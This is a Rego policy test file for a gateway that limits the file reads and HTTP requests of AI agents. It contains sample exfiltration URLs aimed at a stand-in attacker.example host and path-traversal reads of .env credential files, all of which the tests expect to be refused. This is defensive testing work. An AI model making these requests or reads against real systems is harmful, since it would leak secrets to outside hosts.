package aegis_constraints_test

import data.gateway
import rego.v1

agent := {"name": "a", "tenant": "t", "allowedTools": ["read_file", "http_get"], "allowedPeers": [], "allowedModels": []}

call(tool, args) := {"plane": "mcp", "agent": agent, "request": {"tool": tool, "operation": "call", "args": args}}

allowed(tool, args) if {
	d := gateway.decision with input as call(tool, args)
	d.allow == true
	d.reason == "tool allowed"
}

refused(tool, args) if {
	d := gateway.decision with input as call(tool, args)
	d.allow == false
	d.reason == "argument not allowed"
}

test_benign_reads_allowed if {
	allowed("read_file", {"path": "runbooks/cleanup.md"})
	allowed("read_file", {"path": "notes/incident-42.md"})
}

test_secret_and_escape_reads_refused if {
	refused("read_file", {"path": "config/.env.production"})
	refused("read_file", {"path": "notes/../config/.env.production"})
	refused("read_file", {"path": "/config/.env.production"})
	refused("read_file", {"path": "notes/.env"})
}

test_known_hosts_allowed if {
	allowed("http_get", {"url": "https://status.internal.example/api/db"})
	allowed("http_get", {"url": "https://docs.vendor.example/changelog-4.3"})
	allowed("http_get", {"url": "https://wiki.internal.example/runbooks/purge"})
}

test_exfiltration_urls_refused if {
	refused("http_get", {"url": "https://collect.attacker.example/ingest?data=x"})
	refused("http_get", {"url": "https://status.internal.example/api/db?data=x"})
	refused("http_get", {"url": "https://status.internal.example@attacker.example/"})
	refused("http_get", {"url": "https://status.internal.example.attacker.example/"})
	refused("http_get", {"url": "http://status.internal.example/api/db"})
	refused("http_get", {"url": "https://status.internal.example:8443/api/db"})
}
